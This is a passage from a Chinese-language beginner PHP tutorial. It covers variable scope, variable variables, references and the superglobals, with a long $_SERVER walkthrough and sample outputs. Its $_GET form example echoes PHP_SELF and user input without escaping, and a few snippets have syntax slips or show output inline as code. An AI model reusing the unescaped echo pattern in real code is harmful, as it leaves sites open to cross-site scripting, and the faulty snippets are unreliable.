<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test()</span><br><span class="line">hello</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>= <span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&quot;y&quot;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&quot;x&quot;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&quot;y&quot;</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>static静态作用域，用于在函数执行完毕之后保留某个局部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">	<span class="variable">$x</span>++;</span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line">Test();</span><br><span class="line">Test();</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>parameter函数参数作用域，变量在函数声明中，参数是通过调用函数的值转递给局部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = a;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$x</span>;</span><br><span class="line"><span class="comment">#	$$x = $a = &quot;hello&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h2><p>将一个变量赋值给另一个变量</p>
<p>变量传值一共有两种方式：值传递，引用赋值</p>
<h3 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h3><p>将变量保存的值赋值给另外一个变量保存，两个变量之间没有关系</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">#	$a = 20,$b = 10</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="引用赋值"><a href="#引用赋值" class="headerlink" title="引用赋值"></a>引用赋值</h3><p>PHP 支持引用赋值，引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br><span class="line"><span class="comment"># $a = 10,$b = 10</span></span><br><span class="line"><span class="comment"># 这里 $b 是 $a 的引用</span></span><br><span class="line"><span class="comment"># 如果修改 $a 的值, $b 的值也会被改变</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h2><p>预定义变量就是PHP中预先定义好的变量，预定义变量也叫超全局变量，他们不需要提前声明就可以在所有的作用域中使用</p>
<table>
<thead>
<tr>
<th align="center">内置变量</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$GLOBALS</td>
<td align="center">引用全局作用域中可用的全部变量</td>
</tr>
<tr>
<td align="center">$_SERVER</td>
<td align="center">服务器和执行环境信息</td>
</tr>
<tr>
<td align="center">$_GET</td>
<td align="center">HTTP GET变量</td>
</tr>
<tr>
<td align="center">$_POST</td>
<td align="center">HTTP POST变量</td>
</tr>
<tr>
<td align="center">$_FILES</td>
<td align="center">HTTP 文件上传变量</td>
</tr>
<tr>
<td align="center">$_REQUEST</td>
<td align="center">HTTP Request变量</td>
</tr>
<tr>
<td align="center">$_SESSION</td>
<td align="center">Session变量</td>
</tr>
<tr>
<td align="center">$_ENV</td>
<td align="center">环境变量</td>
</tr>
<tr>
<td align="center">$_COOKIE</td>
<td align="center">HTTP Cookies</td>
</tr>
<tr>
<td align="center">$php_errormsg</td>
<td align="center">前一个错误信息</td>
</tr>
<tr>
<td align="center">$http_response_header</td>
<td align="center">HTTP响应头</td>
</tr>
<tr>
<td align="center">$argc</td>
<td align="center">传递给脚本的参数数目</td>
</tr>
<tr>
<td align="center">$argv</td>
<td align="center">传递给脚本的参数数组</td>
</tr>
</tbody></table>
<h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><p>引用全局作用域中可用的全部变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">5</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;x&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><p><code>$_SERVER</code>是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p>
<p>可以通过以下代码遍历所有的项目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$parm</span> =&gt; <span class="variable">$value</span>)  <span class="keyword">echo</span> <span class="variable">$a</span>++.<span class="string">&quot;+++<span class="subst">$parm</span> = &#x27;<span class="subst">$value</span>&#x27;\n&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP_SELF</td>
<td align="center">当前执行脚本的文件名</td>
</tr>
<tr>
<td align="center">argv</td>
<td align="center">传递给该脚本的参数的数组</td>
</tr>
<tr>
<td align="center">argc</td>
<td align="center">包含命令行模式下传递给该脚本的参数的数目</td>
</tr>
<tr>
<td align="center">GATEWAY_INTERFACE</td>
<td align="center">服务器使用的 CGI 规范的版本</td>
</tr>
<tr>
<td align="center">SERVER_ADDR</td>
<td align="center">当前运行脚本所在的服务器的 IP 地址</td>
</tr>
<tr>
<td align="center">SERVER_NAME</td>
<td align="center">当前运行脚本所在的服务器的主机名</td>
</tr>
<tr>
<td align="center">SERVER_SOFTWARE</td>
<td align="center">服务器标识字符串，在响应请求时的头信息中给出</td>
</tr>
<tr>
<td align="center">SERVER_PROTOCOL</td>
<td align="center">请求页面时通信协议的名称和版本</td>
</tr>
<tr>
<td align="center">REQUEST_METHOD</td>
<td align="center">访问页面使用的请求方法</td>
</tr>
<tr>
<td align="center">REQUEST_TIME</td>
<td align="center">请求开始时的时间戳</td>
</tr>
<tr>
<td align="center">REQUEST_TIME_FLOAT</td>
<td align="center">请求开始时的时间戳，微秒级别的精准度</td>
</tr>
<tr>
<td align="center">QUERY_STRING</td>
<td align="center">返回查询字符串，如果是通过查询字符串访问此页面</td>
</tr>
<tr>
<td align="center">DOCUMENT_ROOT</td>
<td align="center">当前运行脚本所在的文档根目录。在服务器配置文件中定义</td>
</tr>
<tr>
<td align="center">HTTP_ACCEPT</td>
<td align="center">返回来自当前请求的请求头Accept: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_ACCEPT_CHARSET</td>
<td align="center">返回来自当前请求的请求头Accept-Charset: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_ACCEPT_ENCODING</td>
<td align="center">返回来自当前请求的请求头Accept-Encoding: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_ACCEPT_LANGUAGE</td>
<td align="center">返回来自当前请求的请求头Accept-Language: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_CONNECTION</td>
<td align="center">返回来自当前请求的请求头Connection: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_HOST</td>
<td align="center">返回来自当前请求的请求头Host: 项的内容</td>
</tr>
<tr>
<td align="center">HTTP_REFERER</td>
<td align="center">引导用户代理到当前页的前一页的地址。由 user agent 设置决定</td>
</tr>
<tr>
<td align="center">HTTP_USER_AGENT</td>
<td align="center">返回来自当前请求的请求头User-Agent: 项的内容</td>
</tr>
<tr>
<td align="center">HTTPS</td>
<td align="center">如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值</td>
</tr>
<tr>
<td align="center">REMOTE_ADDR</td>
<td align="center">浏览当前页面的用户的 IP 地址</td>
</tr>
<tr>
<td align="center">REMOTE_HOST</td>
<td align="center">浏览当前页面的用户的主机名</td>
</tr>
<tr>
<td align="center">REMOTE_PORT</td>
<td align="center">用户机器上连接到 Web 服务器所使用的端口号</td>
</tr>
<tr>
<td align="center">REMOTE_USER</td>
<td align="center">经验证的用户</td>
</tr>
<tr>
<td align="center">REDIRECT_REMOTE_USER</td>
<td align="center">验证的用户，如果请求已在内部重定向</td>
</tr>
<tr>
<td align="center">SCRIPT_FILENAME</td>
<td align="center">当前执行脚本的绝对路径</td>
</tr>
<tr>
<td align="center">SERVER_ADMIN</td>
<td align="center">指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数</td>
</tr>
<tr>
<td align="center">SERVER_PORT</td>
<td align="center">Web 服务器使用的端口</td>
</tr>
<tr>
<td align="center">SERVER_SIGNATURE</td>
<td align="center">包含了服务器版本和虚拟主机名的字符串</td>
</tr>
<tr>
<td align="center">PATH_TRANSLATED</td>
<td align="center">当前脚本所在文件系统（非文档根目录）的基本路径</td>
</tr>
<tr>
<td align="center">SCRIPT_NAME</td>
<td align="center">包含当前脚本的路径</td>
</tr>
<tr>
<td align="center">REQUEST_URI</td>
<td align="center">URI 用来指定要访问的页面</td>
</tr>
<tr>
<td align="center">PHP_AUTH_DIGEST</td>
<td align="center">当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的”Authorization” HTTP 头内容（以便作进一步的认证操作）</td>
</tr>
<tr>
<td align="center">PHP_AUTH_USER</td>
<td align="center">当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名</td>
</tr>
<tr>
<td align="center">PHP_AUTH_PW</td>
<td align="center">当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码</td>
</tr>
<tr>
<td align="center">AUTH_TYPE</td>
<td align="center">当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</td>
</tr>
<tr>
<td align="center">PATH_INFO</td>
<td align="center">包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息</td>
</tr>
<tr>
<td align="center">ORIG_PATH_INFO</td>
<td align="center">在被 PHP 处理之前，”PATH_INFO” 的原始版本</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前执行脚本的文件名 </span></span><br><span class="line"><span class="comment"># /test.php</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$argv</span>);</span><br><span class="line"><span class="comment"># array(0) &#123; &#125;</span></span><br><span class="line">var_dump(<span class="variable">$argc</span>);</span><br><span class="line"><span class="comment"># int(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;argv&quot;</span>];</span><br><span class="line"><span class="comment"># 传递给该脚本的参数的数组</span></span><br><span class="line"><span class="comment"># Array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;argc&quot;</span>];</span><br><span class="line"><span class="comment"># 包含命令行模式下传递给该脚本的参数的数目</span></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;GATEWAY_INTERFACE&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 服务器使用的 CGI 规范的版本</span></span><br><span class="line"><span class="comment"># CGI/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_ADDR&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前运行脚本所在的服务器的 IP 地址</span></span><br><span class="line"><span class="comment"># 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_NAME&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前运行脚本所在的服务器的主机名</span></span><br><span class="line"><span class="comment"># IntelliJ IDEA 2021.2.1 / 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_SOFTWARE&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 服务器标识字符串，在响应请求时的头信息中给出</span></span><br><span class="line"><span class="comment"># Apache/2.4.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_PROTOCOL&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 请求页面时通信协议的名称和版本</span></span><br><span class="line"><span class="comment"># HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 访问页面使用的请求方法</span></span><br><span class="line"><span class="comment"># GET</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_TIME&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 请求开始时的时间戳</span></span><br><span class="line"><span class="comment"># 1635228132</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_TIME_FLOAT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 请求开始时的时间戳，微秒级别的精准度</span></span><br><span class="line"><span class="comment"># 1635228132.3723</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回查询字符串，如果是通过查询字符串访问此页面</span></span><br><span class="line"><span class="comment"># http://127.0.0.1/index.php?q=222&amp;p=333,获取?后面的字符串</span></span><br><span class="line"><span class="comment"># q=222&amp;p=333</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;DOCUMENT_ROOT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前运行脚本所在的文档根目录。在服务器配置文件中定义</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\WWW</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Accept: 项的内容</span></span><br><span class="line"><span class="comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_CHARSET&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Accept-Charset: 项的内容</span></span><br><span class="line"><span class="comment"># Accept-Charset: utf-8, iso-8859-1;q=0.5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_ENCODING&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Accept-Encoding: 项的内容</span></span><br><span class="line"><span class="comment"># Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Accept-Language: 项的内容</span></span><br><span class="line"><span class="comment"># Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CONNECTION&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Connection: 项的内容</span></span><br><span class="line"><span class="comment"># Connection: keep-alive</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头Host: 项的内容</span></span><br><span class="line"><span class="comment"># Host: localhost:43540</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 引导用户代理到当前页的前一页的地址</span></span><br><span class="line">&lt;a href=<span class="string">&quot;test1.php&quot;</span>&gt;点击跳转到test1.php&lt;/a&gt;</span><br><span class="line">test1.php</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 返回来自当前请求的请求头User-Agent: 项的内容</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTPS&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值 on,否则返回空值NULL</span></span><br><span class="line"><span class="comment"># on</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 浏览当前页面的用户的 IP 地址</span></span><br><span class="line"><span class="comment"># 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_HOST&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 浏览当前页面的用户的主机名</span></span><br><span class="line"><span class="comment"># 需要在Apache的http.conf中设置HostnameLookups为On</span></span><br><span class="line"><span class="comment"># 本地测试返回127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_PORT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 用户机器上连接到 Web 服务器所使用的端口号</span></span><br><span class="line"><span class="comment"># 42823</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_USER&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 经验证的用户</span></span><br><span class="line"><span class="comment"># 需要在Apacje中加载Load mod_auth_sspi.so</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REDIRECT_REMOTE_USER&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 验证的用户，如果请求已在内部重定向</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前执行脚本的绝对路径</span></span><br><span class="line"><span class="comment"># C:\phpStudy\PHPTutorial\WWW\test.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_ADMIN&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数</span></span><br><span class="line"><span class="comment"># admin@php.cn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_PORT&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># Web 服务器使用的端口</span></span><br><span class="line"><span class="comment"># 80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_SIGNATURE&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 包含了服务器版本和虚拟主机名的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当前脚本所在文件系统（非文档根目录）的基本路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 包含当前脚本的路径</span></span><br><span class="line"><span class="comment"># /test.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># URI 用来指定要访问的页面</span></span><br><span class="line"><span class="comment"># /test.php?q=222&amp;p=333</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_AUTH_DIGEST&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的&quot;Authorization&quot; HTTP 头内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_AUTH_USER&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_AUTH_PW&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;AUTH_TYPE&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_INFO&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息</span></span><br><span class="line"><span class="comment"># http://127.0.0.1/index.php/some/test?q=123</span></span><br><span class="line"><span class="comment"># /some/test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;ORIG_PATH_INFO&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment"># 在被 PHP 处理之前，&quot;PATH_INFO&quot; 的原始版本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h3><p>HTTP GET变量</p>
<p>在 PHP 中，预定义的 $_GET 变量用于收集来自 method=’get’ 的表单中的值</p>
<p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;get&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;&gt;</span><br><span class="line">	Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo $_GET[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">http://127.0.0.1/test.php?name=1</span><br></pre></td></tr></table></figure>



<h3 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h3><p>HTTP POST变量</p>
<p>在 PHP 中，预定义的 $_POST 变量用于收集来自 method=’post’ 的表单中的值</p>
